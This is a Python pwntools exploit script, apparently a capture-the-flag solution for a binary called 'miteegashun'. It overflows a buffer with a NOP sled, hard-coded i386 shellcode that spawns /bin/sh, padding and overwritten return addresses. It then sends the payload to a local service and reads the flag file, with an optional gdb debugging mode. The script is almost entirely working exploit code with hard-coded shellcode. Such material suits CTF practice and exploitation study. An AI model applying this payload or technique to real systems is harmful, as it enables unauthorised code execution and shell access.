#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./miteegashun"

rhp = {'host':"localhost",'port':12300}
context(os='linux',arch='i386')
binf = ELF(FILENAME)

#hard-corded in the binary
buf             = 0x80f0340
RAs_container_2   = 0x80f04d5
##[0]:
##[1]:preserved RA of main stack frame
##[2]:pusha instruction <-- ((target))
##[3]:
diff = RAs_container_2 - buf

#invoke /bin/sh
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

def exploit(conn):
  conn.recvuntil("\x00")
  
  #generate payload
  payload = p8(0x90) * 0x30 #NOP sled
  payload += shellcode
  payload += "A" * ((diff + 2*4) - len(payload))
  payload += p32(buf)*4
  
  #send payload and run
  conn.sendline(payload)  #must be sendline, not send

  #get the flag
  conn.sendline("cat /flag")

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
      b *0x08048f8f
      b *0x08048fd0
      b *0x8048f2c
      c
    """
    #0x8048f8f: main
    #0x8048f2c: 実際に入力を受け付けるところ
    conn = gdb.debug(FILENAME,cmd)
else:
    conn = remote(rhp['host'],rhp['port'])
exploit(conn)
conn.interactive()

